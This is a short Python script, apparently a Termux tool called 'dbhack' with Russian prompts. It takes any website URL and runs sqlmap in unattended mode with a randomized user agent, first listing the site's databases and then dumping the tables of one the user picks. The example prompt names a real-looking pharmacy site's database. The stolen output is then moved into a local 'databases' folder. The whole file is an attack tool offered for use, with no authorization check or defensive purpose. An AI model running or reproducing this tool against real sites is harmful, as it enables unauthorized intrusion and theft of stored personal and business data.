from colorama import Fore, Style, init
from termcolor import colored
import os
import platform
import pystyle
import sqlmap
import subprocess

clr = """
if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')
"""

exec(clr)

os.system('mkdir databases')
exec(clr)

move = """
if platform.system() == "Windows":
    os.system('')
else:
    os.system('mv /data/data/com.termux/files/home/.local/share/sqlmap/output databases')
"""


pystyle.Write.Print(pystyle.Center.XCenter("""






       /$$ /$$       /$$                           /$$      
      | $$| $$      | $$                          | $$      
  /$$$$$$$| $$$$$$$ | $$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$
 /$$__  $$| $$__  $$| $$__  $$ |____  $$ /$$_____/| $$  /$$/
| $$  | $$| $$  \ $$| $$  \ $$  /$$$$$$$| $$      | $$$$$$/
| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$      | $$_  $$ 
|  $$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$
 \_______/|_______/ |__/  |__/ \_______/ \_______/|__/  \__/


┌──<Введите URL сайта>

"""), pystyle.Colors.white_to_red, interval = 0.0005)
url = input("└─────────")
command = ["sqlmap", "-u", url, "--dbs", "--random-agent", "--batch", "-o"]
exec(clr)
subprocess.run(command)
print("┌──<Введите название базы данных, например: u2298411_aptekarostov.ru>")
dbname = input("└─────────")
command1 = ["sqlmap", "-u", url, "-D", dbname, "--tables", "--random-agent", "--batch", "-o", "--dump"]
subprocess.run(command1)
exec(move)